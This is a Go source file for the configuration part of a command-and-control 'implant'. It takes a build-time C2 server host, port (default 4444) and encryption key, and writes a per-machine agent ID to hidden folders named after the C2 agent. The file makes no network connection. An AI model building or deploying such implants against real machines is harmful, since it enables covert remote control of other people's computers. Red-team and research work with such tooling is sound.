package implant

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// Build-time variables set via -ldflags.
var (
	ServerHost   string
	ServerPort   string
	MasterKeyHex string
	Version      = "1.0.0"
)

// Config holds the implant's runtime configuration.
type Config struct {
	ServerHost string
	ServerPort string
	MasterKey  []byte
	Version    string
	AgentID    string
}

// LoadConfig reads the embedded configuration and persists/generates the Agent UUID.
func LoadConfig() (*Config, error) {
	if ServerHost == "" {
		return nil, fmt.Errorf("ServerHost is not set (use -ldflags)")
	}
	if ServerPort == "" {
		ServerPort = "4444"
	}
	if MasterKeyHex == "" {
		return nil, fmt.Errorf("MasterKeyHex is not set (use -ldflags)")
	}

	masterKey, err := hex.DecodeString(MasterKeyHex)
	if err != nil {
		return nil, fmt.Errorf("decoding master key: %w", err)
	}
	if len(masterKey) != 32 {
		return nil, fmt.Errorf("invalid master key size: %d (expected 32)", len(masterKey))
	}

	agentID, err := loadOrGenerateUUID()
	if err != nil {
		return nil, fmt.Errorf("loading agent UUID: %w", err)
	}

	return &Config{
		ServerHost: ServerHost,
		ServerPort: ServerPort,
		MasterKey:  masterKey,
		Version:    Version,
		AgentID:    agentID,
	}, nil
}

func loadOrGenerateUUID() (string, error) {
	// Always generate a fresh UUID per execution.
	// Each double-click of the exe creates an independent agent session.
	// The persisted UUID at uuidPath is used as a machine fingerprint
	// for correlation across sessions, but is NOT the agent identity.
	id := generateUUIDv4()

	// Persist for machine correlation (optional, non-critical)
	uuidPath := getUUIDPath()
	dir := filepath.Dir(uuidPath)
	os.MkdirAll(dir, 0700)
	os.WriteFile(uuidPath, []byte(id), 0600)

	return id, nil
}

func getUUIDPath() string {
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "c2-agent", ".agent_id")
	default:
		home, err := os.UserHomeDir()
		if err != nil {
			return filepath.Join(os.TempDir(), ".c2-agent-id")
		}
		return filepath.Join(home, ".c2-agent", ".agent_id")
	}
}

func generateUUIDv4() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
